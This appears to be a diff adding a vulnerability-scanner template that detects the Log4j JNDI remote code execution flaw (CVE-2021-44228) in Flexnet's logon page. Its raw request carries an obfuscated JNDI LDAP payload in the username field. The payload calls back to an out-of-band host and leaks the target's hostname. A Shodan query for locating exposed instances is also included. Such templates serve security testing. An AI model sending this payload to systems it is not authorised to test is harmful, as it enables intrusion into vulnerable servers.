@@ -1,0 +1,62 @@
+http:
+    - extractors:
+        - kval:
+            - interactsh_ip
+          type: kval
+        - group: 2
+          part: interactsh_request
+          regex:
+            - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+          type: regex
+        - group: 1
+          part: interactsh_request
+          regex:
+            - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+          type: regex
+      matchers:
+        - part: interactsh_protocol
+          type: word
+          words:
+            - dns
+        - part: interactsh_request
+          regex:
+            - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+          type: regex
+      matchers-condition: and
+      raw:
+        - |
+          POST /flexnet/logon.do HTTP/1.1
+          Host: {{Hostname}}
+          Origin: {{RootURL}}
+          Referer: {{RootURL}}/flexnet/logon.do
+          Content-Type: application/x-www-form-urlencoded
+
+          action=logon&username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}&password={{str}}&domain=FLEXnet
+id: flexnet-log4j-rce
+info:
+    author: shaikhyaser
+    classification:
+        cve-id: CVE-2021-44228
+        cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+        cvss-score: 10
+        cwe-id: CWE-77
+    description: |
+        Flexnet is susceptible to Log4j JNDI remote code execution.
+    metadata:
+        max-request: 1
+        shodan-query: title:"Flexnet"
+    name: Flexnet - Remote Code Execution (Apache Log4j)
+    reference:
+        - https://community.flexera.com/t5/Revenera-Company-News/Security-Advisory-Log4j-Java-Vulnerability-CVE-2021-4104-CVE/ba-p/216905
+    severity: critical
+    tags:
+        - jndi
+        - log4j
+        - flexnet
+        - oast
+        - kev
+        - Flexnet
+variables:
+    rand1: '{{rand_int(111, 999)}}'
+    rand2: '{{rand_int(111, 999)}}'
+    str: '{{rand_base(5)}}'
